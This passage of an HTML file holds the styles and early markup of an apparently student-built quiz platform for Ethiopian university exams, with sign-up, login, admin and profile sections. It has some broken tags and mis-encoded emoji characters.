<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethiopian University Quiz Platform</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        /* Enhanced Welcome Panel Styles with HD Colors */
.welcome-panel {
    background: linear-gradient(135deg, 
        #8A2BE2 0%, 
        #6A5ACD 20%, 
        #4B0082 40%, 
        #9370DB 60%, 
        #7B68EE 80%, 
        #8A2BE2 100%);
    background-size: 400% 400%;
    animation: gradientShift 6s ease infinite;
    color: white;
    padding: 80px 40px;
    text-align: center;
    position: relative;
    overflow: hidden;
    border: 3px solid rgba(255, 215, 0, 0.3);
    box-shadow: 
        0 0 50px rgba(138, 43, 226, 0.5),
        0 0 100px rgba(106, 90, 205, 0.3),
        inset 0 0 50px rgba(255, 255, 255, 0.1);
}

.welcome-panel::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: 
        radial-gradient(circle at 20% 80%, rgba(255, 215, 0, 0.2) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.3) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(147, 112, 219, 0.3) 0%, transparent 50%),
        radial-gradient(circle at 60% 60%, rgba(123, 104, 238, 0.2) 0%, transparent 50%);
    animation: float 8s ease-in-out infinite;
}

.welcome-panel h1 {
    font-size: 3.5rem;
    margin-bottom: 25px;
    text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.5);
    position: relative;
    z-index: 2;
    background: linear-gradient(45deg, #FFD700, #FFEC8B, #FFFACD, #FFD700);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    animation: titleGlow 3s ease-in-out infinite alternate;
}

.welcome-panel p {
    font-size: 1.2rem;
    line-height: 1.8;
    margin-bottom: 40px;
    max-width: 900px;
    margin-left: auto;
    margin-right: auto;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.4);
    position: relative;
    z-index: 2;
    background: linear-gradient(135deg, 
        rgba(255, 255, 255, 0.15) 0%, 
        rgba(255, 255, 255, 0.1) 100%);
    backdrop-filter: blur(15px);
    padding: 30px;
    border-radius: 20px;
    border: 2px solid rgba(255, 255, 255, 0.3);
    box-shadow: 
        0 10px 40px rgba(0, 0, 0, 0.2),
        0 0 30px rgba(255, 215, 0, 0.2);
}

.welcome-panel strong {
    color: #FFD700;
    text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
    font-weight: 700;
}

.welcome-buttons {
    display: flex;
    gap: 25px;
    justify-content: center;
    margin-top: 40px;
    position: relative;
    z-index: 2;
}

.welcome-btn {
    padding: 16px 45px;
    background: linear-gradient(135deg, 
        rgba(255, 215, 0, 0.3) 0%, 
        rgba(255, 255, 255, 0.2) 50%, 
        rgba(255, 215, 0, 0.3) 100%);
    border: 2px solid rgba(255, 215, 0, 0.5);
    border-radius: 50px;
    color: white;
    font-size: 1.1rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    backdrop-filter: blur(15px);
    position: relative;
    overflow: hidden;
    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.4);
    box-shadow: 
        0 6px 20px rgba(0, 0, 0, 0.3),
        inset 0 1px 0 rgba(255, 255, 255, 0.3),
        0 0 20px rgba(255, 215, 0, 0.3);
}

.welcome-btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, 
        transparent, 
        rgba(255, 255, 255, 0.4), 
        transparent);
    transition: left 0.7s;
}

.welcome-btn:hover {
    background: linear-gradient(135deg, 
        rgba(255, 215, 0, 0.5) 0%, 
        rgba(255, 255, 255, 0.3) 50%, 
        rgba(255, 215, 0, 0.5) 100%);
    border-color: rgba(255, 215, 0, 0.8);
    transform: translateY(-3px) scale(1.05);
    box-shadow: 
        0 10px 30px rgba(0, 0, 0, 0.4),
        0 0 30px rgba(255, 215, 0, 0.5),
        inset 0 1px 0 rgba(255, 255, 255, 0.4);
}

.welcome-btn:hover::before {
    left: 100%;
}

.welcome-btn:active {
    transform: translateY(-1px) scale(1.02);
}

/* Animations */
@keyframes gradientShift {
    0% {
        background-position: 0% 50%;
    }
    50% {
        background-position: 100% 50%;
    }
    100% {
        background-position: 0% 50%;
    }
}

@keyframes float {
    0%, 100% {
        transform: translateY(0px) rotate(0deg);
    }
    50% {
        transform: translateY(-25px) rotate(180deg);
    }
}

@keyframes titleGlow {
    0% {
        text-shadow: 
            3px 3px 6px rgba(0, 0, 0, 0.5),
            0 0 25px rgba(255, 215, 0, 0.6);
    }
    100% {
        text-shadow: 
            3px 3px 6px rgba(0, 0, 0, 0.5),
            0 0 40px rgba(255, 215, 0, 0.9),
            0 0 60px rgba(255, 215, 0, 0.7);
    }
}

/* Floating emojis */
.emoji-float {
    position: absolute;
    font-size: 2.5rem;
    opacity: 0.8;
    z-index: 1;
    animation: floatEmoji 8s ease-in-out infinite;
    text-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
}

.emoji-float:nth-child(1) { top: 10%; left: 10%; animation-delay: 0s; }
.emoji-float:nth-child(2) { top: 20%; right: 15%; animation-delay: 1.5s; }
.emoji-float:nth-child(3) { bottom: 30%; left: 15%; animation-delay: 3s; }
.emoji-float:nth-child(4) { bottom: 15%; right: 10%; animation-delay: 4.5s; }
.emoji-float:nth-child(5) { top: 40%; left: 20%; animation-delay: 6s; }

@keyframes floatEmoji {
    0%, 100% {
        transform: translateY(0px) rotate(0deg) scale(1);
        opacity: 0.5;
    }
    50% {
        transform: translateY(-30px) rotate(180deg) scale(1.3);
        opacity: 0.9;
    }
}

/* Responsive design */
@media (max-width: 768px) {
    .welcome-panel {
        padding: 60px 20px;
    }
    
    .welcome-panel h1 {
        font-size: 2.5rem;
    }
    
    .welcome-panel p {
        font-size: 1.1rem;
        padding: 20px;
    }
    
    .welcome-buttons {
        flex-direction: column;
        gap: 15px;
    }
    
    .welcome-btn {
        padding: 14px 30px;
        font-size: 1rem;
    }
    
    .emoji-float {
        font-size: 2rem;
    }
}
        body {
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            position: relative;
        }
        
        /* Navigation Bar */
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
        }
        
        .nav-links {
            display: flex;
            gap: 20px;
            align-items: center;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 5px;
            transition: background 0.3s;
        }
        
        .nav-links a:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .welcome-panel {
            background: linear-gradient(to bottom right, #6a11cb, #2575fc);
            color: white;
            padding: 60px 40px;
            text-align: center;
        }
        
        .welcome-panel h1 {
            font-size: 36px;
            margin-bottom: 15px;
        }
        
        .welcome-buttons {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-top: 30px;
        }
        
        .welcome-btn {
            padding: 12px 30px;
            background: rgba(255, 255, 255, 0.2);
            border: 2px solid white;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .welcome-btn:hover {
            background: white;
            color: #6a11cb;
        }
        
        .form-panel {
            padding: 40px;
        }
        
        .form-title {
            font-size: 28px;
            color: #333;
            margin-bottom: 10px;
        }
        
        .form-subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 14px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5ee;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #6a11cb;
        }
        
        .form-button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 20px;
        }
        
        .form-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.3);
        }
        
        .toggle-form {
            text-align: center;
            margin-top: 25px;
            color: #666;
            font-size: 14px;
        }
        
        .toggle-form a {
            color: #6a11cb;
            text-decoration: none;
            font-weight: 600;
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .success-message {
            color: #2ecc71;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .form-step {
            display: none;
        }
        
        .active-form {
            display: block;
        }
        
        /* Profile and Settings Containers */
        .profile-container, .settings-container {
            padding: 30px;
            display: none;
        }
        
        .profile-header, .settings-header {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .profile-picture-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin-right: 30px;
        }
        
        .profile-picture {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #6a11cb;
        }
        
        .profile-picture-placeholder {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: #f9f5ff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #6a11cb;
            border: 3px solid #6a11cb;
        }
        
        .profile-upload-btn {
            position: absolute;
            bottom: 5px;
            right: 5px;
            background: #6a11cb;
            color: white;
            border: none;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        
        .profile-info {
            flex: 1;
        }
        
        .profile-info h2 {
            margin-bottom: 10px;
            color: #333;
        }
        
        .profile-info p {
            margin-bottom: 5px;
            color: #666;
        }
        
        .profile-stats {
            margin-top: 30px;
        }
        
        .profile-stats h3 {
            margin-bottom: 20px;
            color: #333;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #6a11cb;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 14px;
        }
        
        .profile-details {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .profile-details h3 {
            margin-bottom: 15px;
            color: #333;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e1e5ee;
        }
        
        .detail-item:last-child {
            border-bottom: none;
        }
        
        .detail-label {
            font-weight: 600;
            color: #333;
        }
        
        .detail-value {
            color: #666;
        }
        
        .settings-options {
            display: grid;
            gap: 20px;
        }
        
        .settings-card {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            border: 1px solid #e1e5ee;
        }
        
        .settings-card h3 {
            margin-bottom: 15px;
            color: #333;
        }
        
        .telegram-channel {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .telegram-channel a {
            color: #6a11cb;
            text-decoration: none;
            font-weight: 600;
        }
        
        .telegram-channel a:hover {
            text-decoration: underline;
        }
        
        .password-form {
            margin-top: 20px;
            display: none;
        }
        
        /* Payment Container */
        .payment-container, .dashboard-container, 
        .quiz-container, .results-container, .verification-container,
        .chapter-selection-container {
            padding: 30px;
            display: none;
        }
        
        /* Payment Page */
        .payment-instructions {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
        }
        
        .bank-accounts {
            background: #f0f8ff;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid #2575fc;
        }
        
        .bank-account {
            margin-bottom: 15px;
            padding: 10px;
            background: white;
            border-radius: 5px;
        }
        
        .bank-account:last-child {
            margin-bottom: 0;
        }
        
        .payment-details {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .payment-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .payment-info-item {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid #e1e5ee;
        }
        
        .upload-area {
            border: 2px dashed #e1e5ee;
            border-radius: 10px;
            padding: 30px;
            text-align: center;
            margin-bottom: 20px;
            cursor: pointer;
            background: white;
        }
        
        .upload-area:hover {
            border-color: #6a11cb;
            background-color: #f9f5ff;
        }
        
        .upload-area i {
            font-size: 40px;
            color: #6a11cb;
            margin-bottom: 15px;
        }
        
        #paymentScreenshot {
            display: none;
        }
        
        .preview-container {
            margin-top: 20px;
            display: none;
        }
        
        .preview-container img {
            max-width: 100%;
            max-height: 200px;
            border-radius: 8px;
            margin-bottom: 10px;
        }
        
        .telegram-instructions {
            background: #0088cc;
            color: white;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .telegram-instructions a {
            color: white;
            text-decoration: underline;
        }
        
        /* Verification Page */
        .verification-code-input {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .verification-code-input input {
            flex: 1;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            letter-spacing: 5px;
            background: white;
            color: #333;
        }
        
        .status-message {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: center;
            display: none;
        }
        
        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status-pending {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        /* Dashboard */
        .university-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .university-card {
            border: 2px solid #e1e5ee;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: white;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        
        .university-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            border-color: #6a11cb;
        }
        
        .university-logo {
            height: 70px;
            width: auto;
            margin-bottom: 15px;
            object-fit: contain;
        }
        
        .university-name {
            font-size: 16px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }
        
        .university-status {
            font-size: 13px;
            color: #666;
        }
        
        .status-available {
            color: #2ecc71;
            font-weight: 600;
        }
        
        .status-coming-soon {
            color: #e67e22;
            font-weight: 600;
        }
        
        .subject-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .subject-card {
            border: 1px solid #e1e5ee;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s;
            cursor: pointer;
            background: white;
        }
        
        .subject-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            border-color: #6a11cb;
        }
        
        .subject-icon {
            font-size: 40px;
            color: #6a11cb;
            margin-bottom: 15px;
        }
        
        .coming-soon-message {
            text-align: center;
            padding: 40px;
            background: #f9f9f9;
            border-radius: 10px;
            margin: 20px 0;
        }
        
        .coming-soon-message i {
            font-size: 60px;
            color: #6a11cb;
            margin-bottom: 20px;
        }
        
        /* Quiz */
        .question-container {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            display: none;
        }
        
        .quiz-navigation {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
        }
        
        .nav-button {
            padding: 12px 25px;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .nav-button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        
        /* Results */
        .score {
            font-size: 72px;
            font-weight: bold;
            color: #6a11cb;
            margin: 20px 0;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .profile-dropdown {
            position: relative;
        }
        
        .profile-btn {
            background: rgba(255,255,255,0.2);
            border: none;
            border-radius: 5px;
            color: white;
            padding: 8px 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .dropdown-content {
            display: none;
            position: absolute;
            right: 0;
            background: white;
            min-width: 160px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.1);
            border-radius: 5px;
            z-index: 1;
            border: 1px solid #e1e5ee;
        }
        
        .dropdown-content a {
            color: #333;
            padding: 12px 16px;
            text-decoration: none;
            display: block;
        }
        
        .dropdown-content a:hover {
            background: #f1f1f1;
        }
        
        .profile-dropdown:hover .dropdown-content {
            display: block;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #2ecc71;
            color: white;
            padding: 15px 20px;
            border-radius: 5px;
            z-index: 1000;
            transform: translateX(150%);
            transition: transform 0.3s ease;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .notification.error {
            background: #e74c3c;
        }
        
        .loading-spinner {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #6a11cb;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        .verification-code-display {
            background: #f0f8ff;
            border: 2px dashed #2575fc;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
            display: none;
        }
        
        .verification-code {
            font-size: 32px;
            font-weight: bold;
            letter-spacing: 5px;
            color: #6a11cb;
            margin: 10px 0;
        }
        
        .code-expiry {
            color: #666;
            font-size: 14px;
        }
        
        /* Back Button */
        .back-button {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #f0f0f0;
            border: none;
            border-radius: 5px;
            padding: 10px 15px;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 20px;
            transition: all 0.3s;
            color: #333;
        }
        
        .back-button:hover {
            background: #e0e0e0;
        }
        
        /* Chapter Selection */
        .chapter-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .chapter-card {
            border: 2px solid #e1e5ee;
            border-radius: 10px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s;
            cursor: pointer;
            background: white;
        }
        
        .chapter-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
            border-color: #6a11cb;
        }
        
        .chapter-icon {
            font-size: 50px;
            color: #6a11cb;
            margin-bottom: 15px;
        }
        
        .chapter-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #333;
        }
        
        .chapter-description {
            color: #666;
            margin-bottom: 15px;
        }
        
        .question-count {
            background: #f0f0f0;
            border-radius: 15px;
            padding: 5px 10px;
            font-size: 14px;
            color: #666;
            display: inline-block;
        }
        
        /* Report Issue Button */
        .report-issue-dropdown {
            position: relative;
        }
        
        .report-issue-btn {
            background: #e74c3c;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 8px 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 14px;
        }
        
        .report-issue-btn:hover {
            background: #c0392b;
        }
        
        .report-dropdown-content {
            display: none;
            position: absolute;
            right: 0;
            background: white;
            min-width: 200px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.1);
            border-radius: 5px;
            z-index: 1;
            border: 1px solid #e1e5ee;
        }
        
        .report-dropdown-content a {
            color: #333;
            padding: 12px 16px;
            text-decoration: none;
            display: block;
        }
        
        .report-dropdown-content a:hover {
            background: #f1f1f1;
        }
        
        .report-issue-dropdown:hover .report-dropdown-content {
            display: block;
        }
        
        /* Quiz Timer */
        .quiz-timer {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 10px 15px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .timer-display {
            font-size: 18px;
            font-weight: bold;
            color: #6a11cb;
        }
        
        .timer-warning {
            color: #e74c3c;
        }
        
        /* Quiz Options */
        .option {
            padding: 15px;
            margin-bottom: 10px;
            border: 2px solid #e1e5ee;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .option:hover {
            background: #f9f5ff;
            border-color: #6a11cb;
        }
        
        .option.selected {
            background: #6a11cb;
            color: white;
            border-color: #6a11cb;
        }
        
        /* Progress Bar */
        .progress-bar {
            height: 8px;
            background: #e1e5ee;
            border-radius: 4px;
            margin: 15px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            border-radius: 4px;
            transition: width 0.3s ease;
        }
        
        /* Question Explanation */
        .explanation {
            background: #f0f8ff;
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            border-left: 4px solid #2575fc;
        }
        
        /* Result Details */
        .result-details {
            margin-top: 30px;
        }
        
        .result-item {
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            background: #f9f9f9;
        }
        
        .result-item.correct {
            border-left: 4px solid #2ecc71;
        }
        
        .result-item.incorrect {
            border-left: 4px solid #e74c3c;
        }
        
        /* Leaderboard */
        .leaderboard-container {
            padding: 30px;
            display: none;
        }
        
        .leaderboard-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        .leaderboard-table th, .leaderboard-table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #e1e5ee;
        }
        
        .leaderboard-table th {
            background: #f9f9f9;
            font-weight: 600;
            color: #333;
        }
        
        .leaderboard-table tr:hover {
            background: #f9f5ff;
        }
        
        /* Admin Password Modal */
        .admin-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        
        .admin-modal-content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        
        /* Quiz Review */
        .quiz-review {
            margin-top: 30px;
            display: none;
        }
        
        @media (max-width: 768px) {
            .container {
                max-width: 450px;
            }
            
            .welcome-panel, .form-panel {
                padding: 30px 20px;
            }
            
            .payment-container, .dashboard-container, 
            .quiz-container, .results-container, .verification-container,
            .chapter-selection-container {
                padding: 20px;
            }
            
            .payment-info {
                grid-template-columns: 1fr;
            }
            
            .subject-grid {
                grid-template-columns: 1fr;
            }
            
            .university-grid {
                grid-template-columns: 1fr;
            }
            
            .chapter-grid {
                grid-template-columns: 1fr;
            }
            
            .verification-code-input {
                flex-direction: column;
            }
            
            .welcome-buttons {
                flex-direction: column;
            }
            
            .navbar {
                flex-direction: column;
                gap: 15px;
            }
            
            .profile-header {
                flex-direction: column;
                text-align: center;
            }
            
            .profile-picture-container {
                margin-right: 0;
                margin-bottom: 20px;
            }
            
            .stats-grid {
                grid-template-columns: 1fr 1fr;
            }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- Notification System -->
    <div class="notification" id="notification"></div>
    
    <!-- Admin Password Modal -->
    <div class="admin-modal" id="adminModal">
        <div class="admin-modal-content">
            <h2 class="form-title">Admin Access</h2>
            <p class="form-subtitle">Enter admin password to access leaderboard</p>
            <div class="form-group">
                <input type="password" id="adminPassword" class="form-control" placeholder="Enter admin password">
                <div class="error-message" id="adminPasswordError">Incorrect password</div>
            </div>
            <button class="form-button" id="submitAdminPassword">Submit</button>
            <button class="form-button" style="background: #666; margin-top: 10px;" id="cancelAdminPassword">Cancel</button>
        </div>
    </div>
    
    <div class="container">
        <!-- Navigation Bar -->
        <div class="navbar" id="navbar" style="display: none;">
            <div class="logo">Knowledge Zone</div>
            <div class="nav-links">
                <a href="#" id="homeLink">Home</a>
                <div class="report-issue-dropdown" id="reportIssueDropdown">
                    <button class="report-issue-btn">
                        <i class="fas fa-exclamation-circle"></i> Report Issue
                        <i class="fas fa-caret-down"></i>
                    </button>
                    <div class="report-dropdown-content">
                        <a href="https://t.me/journeyko" target="_blank">Report to @journeyko</a>
                        <a href="https://t.me/necessity9" target="_blank">Report to @necessity9</a>
                    </div>
                </div>
<div class="user-info" id="userInfo" style="display: none;">
    <div class="profile-dropdown">
        <button class="profile-btn">
            <i class="fas fa-user"></i>
            <span id="userName"></span>
            <i class="fas fa-caret-down"></i>
        </button>
        <div class="dropdown-content">
            <a href="#" id="profileLink">Profile</a>
            <a href="#" id="settingsLink">Settings</a>
            <a href="#" id="leaderboardLink">Leaderboard</a>
            <a href="#" id="logoutButton">Logout</a>
        </div>
    </div>
</div>
            </div>
        </div>
        
        <!-- Welcome Panel -->
<div class="welcome-panel" id="welcomePanel">
    <!-- Floating emojis -->
    <div class="emoji-float">üöÄ</div>
    <div class="emoji-float">üåü</div>
    <div class="emoji-float">üéØ</div>
    <div class="emoji-float">üèÜ</div>
    <div class="emoji-float">‚ú®</div>
    
    <h1>Welcome to <span style="color:#2110e0;font-weight:800">Exam Mastery Hub Of Haramaya</span></h1>
    <p>
        üåü Step into </strong>Exam Mastery Hub  </p>strong>  the ultimate place where champions are made 
        and exams are conquered! üåü <br><br>
        
        üöÄ <strong>Boost your confidence</strong> with real exam-style practice. <br>
        üß† <strong>Sharpen your mind</strong> through smart, engaging quizzes. <br>
        üèÜ <strong>Climb the leaderboard</strong> and challenge yourself to greatness. <br>
        üéØ <strong>Achieve exam mastery</strong> with fun, focused learning. <br><br>
        
        Every click brings you closer to victory. <br>
        <strong>Study smarter, rise higher, and shine brighter ‚Äî your success story begins here! ‚ú®</strong>
    </p>
    <div class="welcome-buttons">
        <button class="welcome-btn" id="showRegister">naol up</button>
        <button class="welcome-btn" id="showLogin">naol In</button>
    </div>
</div>
        
        <!-- Forms Panel -->
        <div class="form-panel" id="formPanel" style="display: none;">
            <div class="form-container">
                <!-- Registration Form -->
                <div id="register-form" class="form-step">
                    <h2 class="form-title">Sign Up</h2>
                    <p class="form-subtitle">Create your account in less than a minute</p>
                    
                    <form id="registrationForm">
                        <div class="form-group">
                            <label for="fullName">Full Name</label>
                            <input type="text" id="fullName" class="form-control" placeholder="Enter your full name" required>
                            <div class="error-message" id="nameError">Please enter your full name</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="regEmail">Email Address</label>
                            <input type="email" id="regEmail" class="form-control" placeholder="Enter your email" required>
                            <div class="error-message" id="regEmailError">Please enter a valid email address</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="telegramUsername">Telegram Username</label>
                            <input type="text" id="telegramUsername" class="form-control" placeholder="@username" required>
                            <div class="error-message" id="telegramError">Please enter a valid Telegram username</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="regPassword">Password</label>
                            <input type="password" id="regPassword" class="form-control" placeholder="Create a password" required>
                            <div class="error-message" id="regPasswordError">Password must be at least 8 characters with uppercase, lowercase, and number</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="confirmPassword">Confirm Password</label>
                            <input type="password" id="confirmPassword" class="form-control" placeholder="Confirm your password" required>
                            <div class="error-message" id="confirmPasswordError">Passwords do not match</div>
                        </div>
                        
                        <button type="submit" class="form-button">Create Account</button>
                    </form>
                    
                    <div class="toggle-form">
                        Already have an account? <a id="show-login">Sign in here</a>
                    </div>
                </div>
                
                <!-- Login Form -->
                <div id="login-form" class="form-step">
                    <h2 class="form-title">Welcome Back</h2>
                    <p class="form-subtitle">Sign in to your account to continue</p>
                    
                    <form id="loginForm">
                        <div class="form-group">
                            <label for="loginEmail">Email Address</label>
                            <input type="email" id="loginEmail" class="form-control" placeholder="Enter your email" required>
                            <div class="error-message" id="loginEmailError">Please enter a valid email address</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="loginPassword">Password</label>
                            <input type="password" id="loginPassword" class="form-control" placeholder="Enter your password" required>
                            <div class="error-message" id="loginPasswordError">Please enter your password</div>
                        </div>
                        
                        <button type="submit" class="form-button">Sign In</button>
                    </form>
                    
                    <div class="toggle-form">
                        Don't have an account? <a id="show-register">Sign up here</a>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Profile Container -->
        <div class="profile-container" id="profileContainer">
            <button class="back-button" id="backFromProfile">
                <i class="fas fa-arrow-left"></i> Back
            </button>
            <div class="profile-header">
                <div class="profile-picture-container">
                    <div class="profile-picture-placeholder" id="profilePicturePlaceholder">
                        <i class="fas fa-user"></i>
                    </div>
                    <img id="profilePicture" class="profile-picture" style="display: none;" alt="Profile Picture">
                    <input type="file" id="profilePictureInput" accept="image/*" style="display: none;">
